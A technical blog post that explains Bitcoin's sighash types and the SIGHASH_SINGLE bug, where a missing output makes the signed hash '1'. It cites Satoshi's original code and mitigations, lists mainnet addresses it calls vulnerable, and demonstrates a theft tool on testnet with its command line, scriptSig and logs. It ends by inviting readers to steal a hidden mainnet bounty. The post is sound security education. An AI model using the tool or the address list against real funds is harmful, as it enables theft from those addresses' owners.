# One *Single* Trick To Lose Your Coins

While implementing some code relating to Bitcoin's P2P network security I've stumbled upon a long standing issue in Bitcoin caused by no other than Satoshi himself.

To better explain it we'll first have to get acquainted a little bit deeper with Bitcoin's transaction format.
So a bitcoin transaction has the following fields.

1. `version`.
1. `witnessFlag`, optional.
1. `inputsNum`, the number of inputs in the transaction.
1. `inputs`, an array of length `inputsNum` describing the inputs of the transaction.
1. `outputsNum`, the number of outputs in the transaction.
1. `outputs`, an array of length `outputsNum` describing the outputs of the transaction.
1. `witnessInfo`, optional, exists only if `witnessFlag` is specified.
1. `locktime`, can be used to apply some restrictions on the outputs of this transaction.

We will not be explaining the meaning of all fields with all edge cases involved, but the general sense you should get is that transactions are typically the conversion of a set of existing unspent-transaction-outputs (UTXOs) into a set of new UTXOs.

The existing UTXOs, spent in the transaction are referred to as the inputs of the transaction.
When creating a transaction, we specify in field 3 the number of inputs and in field 4 the inputs themselves.
Similarly, new UTXOs, created in the transaction are referred to as the outputs of the transaction.
Thus, when creating a transaction, we specify in field 5 the number of outputs and in field 6 the outputs themselves.

Let's looks on the inside of those inputs and outputs and what information is required to encode them.
We shall begin with outputs since they are simpler and contain fewer pieces of information.
An output of transaction contains the following two attributes:

1. `value`, how many satoshis are stores in this output.
1. `scriptPubkey`, who can spend the coins in this output.

While the `value` attribute is easy to grasp, you can think of the `scriptPubkey` attribute as a puzzle that whoever wants to spend this output has to solve.
When you're sending some coins to your friend, she gives you her Bitcoin address, this address is directly decoded in this `scriptPubkey` address, so your Bitcoin wallet will specify in the output a puzzle that only your friend can solve, using her private key.
This puzzle is specified under the hood using a "programing language" dedicated to Bitcoin call "script".
You can find further information about Bitcoin script [here](https://en.bitcoin.it/wiki/Script).

Great, now let's move to the inputs.
An input contains the following four fields:

1. `txid`, the hash of the transaction which contains the output were are spending in this input.
1. `vout`, the transaction with hash `txid` may contain multiple outputs, this field specifies which of the outputs of that transaction are we spending in this input.
1. `scriptSig`, the solution to the puzzle of the output being spent, which typically includes a digital signature.
1. `sequence`, used for RBF signalling, irrelevant for this article.

With all given information, the following is a schematic format of the transaction:

![Transaction Format](./images/tx_form.jpg)

Let's have an example, consider Alice has 1 BTC she received at transaction with txid `ab01...0342` (we'll be using abbreviated notation instead of writing a long transaction ID).
Thus, this transaction has a single output worth 1 BTC which can only be spent using Alice's private key.
Alice wants to send this 1 BTC to Bob.
To do so, she asks from Bob for his address which encompasses Bob's public key.
Next, she creates a transaction with a single input, referring to the first out output from transaction previous transaction (so `vout = 0` and `txid = ab01...0342`), she computes her signature using her private key this input, thereby authorizing the payment and attaches it to the `scriptSig` field in the input.
In the output of the transaction she creates a single output with `value = 100,000,000`, which are 100,000,000 satoshis, that is single BTC and is writing Bob's public key in the `scriptPubkey` field.

The result transaction, ignoring irrelevant fields looks something like this:

![Example Transaction](./images/example_tx.jpg)

Now that we know roughly how transactions work, let's get a little bit deeper into the `scriptSig` field.
In our previous example Alice was computing a signature of the transaction she was sending to Bob.
Digital signatures (such as ECDSA signatures used in Bitcoin) are considered hard to forge without owning the private key.
That means that without the private key an attacker using Alice's previous signatures will not be able to generate a new signature authorizing the spending of one of her UTXOs.
When computing a digital signature, the signing procedure typically takes an arbitrarily sized buffer, compute the hash of the contents of this buffer and employ the mathematical procedure on the hash of the message.
So, when Alice is computing the digital signature, what exactly is this buffer that will be passed into the signing procedure?
The most common case is that all contents of the transaction (besides the signature itself, of course) are signed, this is probably what you would expect and even implement your self if you were trying to write your own version of Bitcoin.
However, in Bitcoin other modes are available which allow the spender to sign only part of the information in the transaction to allow higher degrees of freedom and perhaps more sophisticated use cases.
The exact mode comes right after the digital signature in the `scriptSig` field and is encoded using a single byte known as a `SIGHASH_TYPE`.

## SigHash Types

So we already know that there is a piece of information encoded in the `scriptSig` field of each input of a transaction that is responsible to dictate what pieces of information in the transaction will the spender sign on.

One common feature to all possible modes is that the input being spent (i.e. the input for which we compute the `scriptSig`) is being signed.
There are six possible options for the `sighash` byte which will be introduced using the following scenario.
Let's say we have a transaction with two inputs and three outputs and we are computing the signature for the `scriptSig` in the second input.
In the following we present all sighash types accompanies with a visual of the said transaction where the inputs / outputs that are signed are colored in green.

### SIGHASH_ALL

The first sighash type is `SIGHASH_ALL` in which the all inputs and all outputs of the transaction are signed.
Almost all signatures in the blockchain of Bitcoin are accompanied with this kind of sighash type.

![Sighash all](images/sighash_all.jpg)

### SIGHASH_ALL | SIGHASH_ANYONECANPAY

In this sighash type all outputs are signed but the `SIGHASH_ANYONECANPAY` signifies that only one of the inputs is signed, that is the input for which this sighash type is specified in.
This means, as its name suggests that anyone else who has this transaction can join and add inputs to this transaction as long as it preserves the same outputs that are signed.
In other words, since the spender isn't signing other inputs except his own input, anyone else can take this transaction and modify it by adding another input as long as he doesn't modify the outputs that are provided with the original transaction.

Consider the following scenario, you and three other friends would like to buy a gift to another friend for her birthday.
The gift costs 10000 satoshis which should be sent to the address of the merchant and you have decided to split the payment evenly, so each one of you pays 2500 satoshis.
To accomplish the payment, you and your friends will sign (separately) the spending of a UTXO with 2500 satoshis where which will be sent to the merchant (as the first output). Notice that the output will contain the value of `10000` despite each friend signs only an input of 2500.
By merging these signed inputs you can create a valid transaction and send it to the merchant.

![Sighash all | Sighash Anyonecanpay](images/sighash_all_anyonecanpay.jpg)

### SIGHASH_NONE

In this sighash type none of the outputs is signed and all inputs are signed.
Therefore, when signing an input using this sighash type, the spender is saying "I'm OK with spending this input as long as the other inputs which I'm signing on are also spent. I'm also OK that the coins associated with this input will be sent to wherever the other spender decide".

![Sighash None](images/sighash_none.jpg)

### SIGHASH_NONE | SIGHASH_ANYONECANPAY

In this sighash type none of the outputs is signed and only the input being spent is signed.
Therefore, when signing an input using this sighash type, the spender is say "I'm OK with spending this input and I really don't care what will eventually happen with it".
Anyone who receives such an input can take it and spend it in any way the see fit. This is because the sighash doesn't apply and constraints on any other input or output in the transaction.
What you may expect to happen eventually is that the miner who sees a transaction containing such a sighash type, to take the input to himself.

![Sighash None | Sighash Anyonecanpay](images/sighash_none_anyonecanpay.jpg)

### SIGHASH_SINGLE

In this sighash type all inputs are signed and only one output is signed.
Namely, if we are trying to spend input number 2 (therefore, computing the `scriptSig` for that input), we will sig on the output with the matching index, in our case that would be output number 2.
When spending such an input the spender is say "I'm OK with spending this input in any transaction who contains this specific output and as long as all other inputs who I'm signing on are also taking part in the transaction".
The other parties signing the rest of the inputs can add outputs to the transaction as they see fit, as long as the value of all outputs isn't above the value of all inputs, of course.

![Sighash Single](images/sighash_single.jpg)

### SIGHASH_SINGLE | SIGHASH_ANYONECANPAY

In this sighash type, only one input is signed and one output is signed.
Just like `SIGHASH_SINGLE`, the output which will be signed is the output with the matching index to the index of the input being signed.
When spending an input using this sighash the spender is saying "I'm OK with spending this input in any transaction who also contains this output on which I'm signing".

![Sighash Single | Sighash Anyonecanpay](images/sighash_single_anyonecanpay.jpg)

## The Bug

Now we know what is a sighash and what are the six types of sighashes it's time to share the bug with you.
The issue lies within the definition of `SIGHASH_SINGLE` and `SIGHASH_SINGLE | SIGHASH_ANYONECANPAY`.
Specifically, both sighash types sign a single output with the matching index as the index of the input for which this sighash mode is specified.
But what if no such output exists?
What do we hash in that case?
Well, this is a great question so please first stop and try to think what you might have expected to happen in such a scenario.
While you have probably thought of either forbidding such transactions to be mined (as part of Bitcoin's consensus rules) or simply interpret the sighash type as `SIGHASH_NONE` or `SIGHASH_NONE | SIGHASH_ANYONECANPAY`, hereby signing only on the inputs, neither of these is what actually happening.
What happens is, the signature simply signs the hash of the 256-bit little-endian number "0000...0001", which we will simply call "1" for the sake of brevity.
That is, while typically messages are hashed and signed, in this case no message is provided and the signing algorithm is directly given the said value of "1".
Can you think of any meaningful implication for this?

### So what?

The most prominent implication of this behavior, is that if an attacker manages to obtain, by any mean, the signature of "1" from your private key, he will immediately gain indefinite access to your account.
In other words, if you publish a signature on the hash value "1", you can kiss goodbye to all your funds from the associated address.
Why is that?
How can this be exploited?
If you publish a signature on hash "1" using the secret key associated with your Bitcoin address, the attacker can take this signature, stick it in the `scriptSig` field of an input with sighash type of `SIGHASH_SINGLE` and place this input as the second input in a transaction with two inputs, where the first input would be any UTXO owned by the attacker which the attacker can spend.
The single output of this transaction will be destined to the attacker with all value from both inputs (his own input and the victim's input) sent to him.
Let's visualize the attack and exemplify it, consider we have a victim with some UTXO owned by him with value of `Y` satoshis and we have a signature of the victim on the hash value "1".
On the side there's an Attacker with a UTXO owned by him with value of `X` satoshis.
The "ingredient" for the attack, therefore, would look like this:

![attack input](images/attack_input.jpg)

The attacker, using his private key and these inputs will create the following transaction:

![attack transaction](images/attack_tx.jpg)

Pay extra attention to the following details:

1. The attacker spends the victim's UTXO using **SIGHASH_SINGLE**. Therefore when any other node will verify if this transaction is valid it will check that the signature inside the scriptSig is valid.
1. To check if this scriptSig is valid it has to compute the hash according to the sighash type, which is `SIGHASH_SINGLE`, that means it will have all inputs and the single matching output.
1. Since there is no matching output, any node verifying the tx is programmed to look for the signature on the hash value of "1".
1. Since the attacker already has the signature on (from any other source) he can simply use this signature to spend any UTXO owned by the victim.
1. The **second** input refers to a UTXO owned by the victim. If the first was referring the attack wouldn't have worked. That is because in that case the nodes would expect the signature the be on the hash of all inputs and the second output.
1. The value of the output is X+Y, i.e. the sum of the values of the UTXOs spent in the transaction.

This is it, that is the actual bug and that's how it can be exploited.

## Did Satoshi Really Create This Bug?

Yes, this bug was created by no other than the legendary Satoshi Nakamoto, go ahead and look at it yourself.
To do so, download the first version of Bitcoin's v0.1.0 source code from Nakamoto Institute using [this link](https://satoshi.nakamotoinstitute.org/code/).
Navigate to `script.cpp` file at line 818 you can find the `SignatureHash` function containing the following piece of code:

```cpp
uint256 SignatureHash(CScript scriptCode, const CTransaction& txTo, unsigned int nIn, int nHashType)
{
    if (nIn >= txTo.vin.size())
    {
        printf("ERROR: SignatureHash() : nIn=%d out of range\n", nIn);
        return 1;
    }
    //...Some irrelevant code...
}
```

As you can see, if the variable `nHashType & 0x1f` is equal to `SIGHASH_SINGLE` then the given input we are processing contains a signature with sighash of type `SIGHASH_SINGLE`, so we're looking for the matching output and if it doesn't exist, we return the value `1` as an error code.
Next, the `SignatureHash` function is called from the `CheckSig` function (also at `script.cpp` line 881)

```cpp
bool CheckSig(vector<unsigned char> vchSig, vector<unsigned char> vchPubKey, CScript scriptCode,
              const CTransaction& txTo, unsigned int nIn, int nHashType)
{
    // ...Some irrelevant code...
    if (key.Verify(SignatureHash(scriptCode, txTo, nIn, nHashType), vchSig))
        return true;

    return false;
}
```

So as part of the signature checking the code was calling the `SignatureHash` function and sent its output value directly to the `key.Verify` function without checking for the error code.
Because of this bug, the consensus of Bitcoin allows for inputs signed with SIGHASH_SINGLE to be the ECDSA signature with the private key on the hash of the 256-bit value of 1.

## Mitigation

To prevent users from accidentally triggering this bug, thereby publishing a signature on the hash value of "1", the first thing that happened was that Bitcoin-core's code prevents the user from signing such transactions as written in the code [here](https://github.com/bitcoin/bitcoin/blob/c561f2f06ed25f08f7776ac41aeb2999ebe79550/src/script/sign.cpp#L657).
Taproot addresses, introduced in [BIP-341](https://github.com/bitcoin/bips/blob/master/bip-0341.mediawiki) as part of the taproot upgrade, can't create signature with `SIGHASH_SINGLE` such and without a matching output as this will invalidate such transactions.

## Some Tools
I've written a tool called `bitcoin-scan-sighash` which can connect to a local instance of a bitcoin-core node and scan the blockchain for such instances, you can check the repo [here](https://github.com/ZenGo-X/bitcoin-sighash-scan).
Using this tool I have compiled a list of numerous addresses who are vulnerable to the bug.

```
112jWgS2NYh6bwn2BWzNcPgELXxLxftx31
112RCi89FwLb64LePtxCHB86jY4BBAhLiP
1134V46popKAN2QLh1jDMCKPA6fjRnHTAP
1135zjYCkCGJUnuVG7yZcSFuLofcM5g2T
113VrEwZ7L77yFHD2yoKR8qZFr5Xuq8Khs
114cLg5Gc3hkkWuMN5B55YVLzPxS49VMvc
12S88cuMiUA7JdGsHTbKsXezUFzE2nNjFt
15iwPhxErFDyQTJew81ok9hCbQNhyWuXq1
19gVuEdDZ9XfmRSjLeAnywJ1zJoGig7qxq
19MxhZPumMt9ntfszzCTPmWNQeh6j6QqP2
1BqtnfhJS75AXKuDUAJ22XxU2QHNnENAcH
1CeBmgAuBj8WVhwpEVqPPMyV36uHZRfevy
1CgCMLupoVAnxFJwHTYTKrrRD3uoi3r1ag
1cSSVdjkGRJJRdsFH3mfmDEQHGpyz8jka
1Cy7gqTPMKDYpVS55MX7qemJBCE7tYbQY
1EaVdukMkbwrmsndGgwoTw4jR8im9TGhZ7
1EPPr3UQf6YMhEtejpjNUK6bVZ5HHLXjZ5
1FFtUDpR2CYZDc9TxzNpbNP1U6cXQ9Lq5c
1FjHqLzpeoMtaYa8MpbiYgbWihNGFocQno
1FoELHXby4WYTVXxCcXf8nrnz3VvNUG2EG
1fVuHc1ho7HhU9t8gk5xDDQzoiaEKShPs
1Hh9Uur2QuCLBT7RQxPkSGrYPb6Vbd7iAs
1JEM3niCozNRksJf3iYmBS99Yr1xUGc3KF
1KxmSmcMTmPvU1qSLYpJLrqnSzBoQ53NXN
1L5G9BRZ2o6HsKkMBJcUzg6nK1CgPjmgsz
1L5vVsCYa5cC4xttt2WnbT6UtkjrxwyskV
1YLtj6tygZh35AUKTqvxHedpydQbc1MaP
```

Notice that this tool also outputs the exact `txid` and `vout` in which the `scriptSig` contains a `SIGHASH_SINGLE` (or the `SIGHASH_SINGLE | SIGHASH_ANYONECANPAY` variant).

So, it would be nice if we could put out knowledge to the test. 
In theory if any of these addresses had a positive balance, we could have stolen their coins using our knowledge.
Since they are emptied (are they?), we can try doing something else, sending a small amount of coins to such vulnerable address and then "steal" the coins sent there.

In order to do so, I've written another tool called `bitcoin-steal-sighash` available [here](https://github.com/ZenGo-X/bitcoin-sighash-steal).

Let's give an example of how we can use it.
Let's say we have an address that is vulnerable to the `SIGHASH_SINGLE` bug, that means we have some `scriptSig` of some input within some transaction on which the owner of this address have signed "1".

To save you the effort, I have created such a vulnerable address on the testnet of Bitcoin.
The address is `mhHZmAp9ZAD2GuFqvg9ekQk9WwGX5iQGxt` and the vulnerable `scriptSig` is:
```
4730440220569956d2c2cbe1f75f1c1b2ff2180aabe0dd230a65636607db2bd17dc53cb30f02207078a47daa5f65c12f729323b55e0321576f6b0d50b374a89ee48b0e2f549e2a032102773ed626ccf14ce7317fc0bcc8c657df61a6b2267966a004b070d0c2dfe1e70f
```

So feel free to use it!
In fact, let's use it now.

Now, before running the tool (on testnet) you have to run a testnet node, that means you'll have to modify your node's configuration so that it will connect to the testnet, typically all it takes is to add the `testnet=1` line inside your node's configuration file or run your node with the `-testnet` flag.
This is done on purpose to make it a little bit harder for you to run this on mainnet so you won't accidentally lose your precious coins. *Please don't run this on mainnet unless you know what you're doing!*

To use it we'll have to specify the following:
1. attacker address (using `--attacker-address`), this is our address (since we're the attackers!), stolen funds will be sent to this address. Notice that to employ this attack you'll have to own some coins in this address (since we need some initial utxo to spend). You can use any Bitcoin-testnet faucet, I used [this one](https://testnet-faucet.mempool.co/).
2. The properties of the UTXO owned by the victim which we want to steal, that is the `txid` (using the `--steal-txid` flag) and the `vout` (using the `--steal-vout` flag).
3. Vulnerable script - This is a `scriptSig` which contains the signature on "1" signed by the victim.

Using these inputs we can run our tool:

```
> bitcoin-steal-sighash \
    --attacker-address mp4TunkzwEbpmRQfz6tRaFAcQYmBoFgQKP \
    --steal-txid 410978b8ec22ed9c15f9869c3de45f1df1cc72dcad4ac9804f16eb9f6632aadb \
    --steal-vout 1 \
    --vuln-script 4730440220569956d2c2cbe1f75f1c1b2ff2180aabe0dd230a65636607db2bd17dc53cb30f02207078a47daa5f65c12f729323b55e0321576f6b0d50b374a89ee48b0e2f549e2a032102773ed626ccf14ce7317fc0bcc8c657df61a6b2267966a004b070d0c2dfe1e70f

[00:00:00.000] (7fba1c3c57c0) INFO   Using .cookie auth with path: /home/matan/.bitcoin/testnet3/.cookie
[00:00:00.000] (7fba1c3c57c0) INFO   Using url: http://127.0.0.1:18332
[00:00:00.001] (7fba1c3c57c0) INFO   Spending utxo: txid: 410978b8ec22ed9c15f9869c3de45f1df1cc72dcad4ac9804f16eb9f6632aadb, vout: 0
[00:00:00.008] (7fba1c3c57c0) INFO   steal_tx: Transaction { version: 2, lock_time: 0, input: [TxIn { previous_output: OutPoint { txid: 410978b8ec22ed9c15f9869c3de45f1df1cc72dcad4ac9804f16eb9f6632aadb, vout: 0 }, script_sig: Script(OP_PUSHBYTES_71 304402203a52f4e75e07f1745a99c52a6cab35efebf3b6748ddb29a580e5c6f09c8db0b10220418b2c9b752b7617fb3bb255842e5dc4baa8ff6595ca66b8a118e2a0091d125a03 OP_PUSHBYTES_33 02e9ebcfe1ada8a3ebf9c9978de06b8290a568e78c19411c261909890006b1273c), sequence: 4294967295, witness: [] }, TxIn { previous_output: OutPoint { txid: 410978b8ec22ed9c15f9869c3de45f1df1cc72dcad4ac9804f16eb9f6632aadb, vout: 1 }, script_sig: Script(OP_PUSHBYTES_71 30440220569956d2c2cbe1f75f1c1b2ff2180aabe0dd230a65636607db2bd17dc53cb30f02207078a47daa5f65c12f729323b55e0321576f6b0d50b374a89ee48b0e2f549e2a03 OP_PUSHBYTES_33 02773ed626ccf14ce7317fc0bcc8c657df61a6b2267966a004b070d0c2dfe1e70f), sequence: 4294967295, witness: [] }], output: [TxOut { value: 365921, script_pubkey: Script(OP_DUP OP_HASH160 OP_PUSHBYTES_20 5db69f9669402ac82b24302665d7a5e72e62fbfc OP_EQUALVERIFY OP_CHECKSIG) }] }
[00:00:00.008] (7fba1c3c57c0) INFO   steal_tx raw: 0200000002dbaa32669feb164f80c94aaddc72ccf11d5fe43d9c86f9159ced22ecb8780941000000006a47304402203a52f4e75e07f1745a99c52a6cab35efebf3b6748ddb29a580e5c6f09c8db0b10220418b2c9b752b7617fb3bb255842e5dc4baa8ff6595ca66b8a118e2a0091d125a032102e9ebcfe1ada8a3ebf9c9978de06b8290a568e78c19411c261909890006b1273cffffffffdbaa32669feb164f80c94aaddc72ccf11d5fe43d9c86f9159ced22ecb8780941010000006a4730440220569956d2c2cbe1f75f1c1b2ff2180aabe0dd230a65636607db2bd17dc53cb30f02207078a47daa5f65c12f729323b55e0321576f6b0d50b374a89ee48b0e2f549e2a032102773ed626ccf14ce7317fc0bcc8c657df61a6b2267966a004b070d0c2dfe1e70fffffffff0161950500000000001976a9145db69f9669402ac82b24302665d7a5e72e62fbfc88ac00000000
[00:00:00.010] (7fba1c3c57c0) INFO   https://blockstream.info/testnet/tx/195f980f04e81444aa37aaa9bb6bdf40295776ba5fa36e96ed28da6f5b55dd7d?input:0&expand
[00:00:00.010] (7fba1c3c57c0) INFO   https://blockstream.info/testnet/address/mp4TunkzwEbpmRQfz6tRaFAcQYmBoFgQKP
[00:00:00.010] (7fba1c3c57c0) INFO   Finished, leaving!
```

You'll probably have to send some testnet coins to the vulnerable address first and then using the sent coins you can steal those back!
When our tool finishes its execution (successfully) it writes the link to Blocksteam's explorer, you can check the links in the example to see how a successful execution looks like.

## Ending Thoughts

I hope you've learnt something new about Bitcoin and how the different parts of it come together. Try and imagining how difficult it is to design and maintain systems which rely on distributed consensus and how one tiny bug has remained with us for over 13 years.

In one address on the mainnet I've also hidden a (very) small bounty that you can steal if you follow everything here correctly. 
So go ahead and good luck!
The winner is kindly requested to get in touch with me on [Twitter](https://twitter.com/MHamilis) or [Telegram](https://t.me/hamilis).
If you have any questions feel free to ask on Twitter / Telegram too.
